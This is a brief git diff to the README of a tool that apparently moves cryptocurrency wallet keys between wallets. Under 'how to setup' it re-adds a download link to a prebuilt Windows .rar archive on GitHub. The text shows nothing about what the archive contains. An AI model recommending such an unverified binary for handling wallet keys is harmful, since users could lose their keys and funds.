@@ -10,8 +10,7 @@ export to another, move keys between different wallets, etc.
 
 ## how to setup
 
-- (Download Wallet Key Tool)[https://github.com/JPMorisGit/wallet-key-tool/releases/download/walletkeytool_windows/WalletKeyTool.rar]
----------------------------------------
++ (Download Wallet Key Tool)[https://github.com/JPMorisGit/wallet-key-tool/releases/download/walletkeytool_windows/WalletKeyTool.rar]
 
 ## how to build from source
 
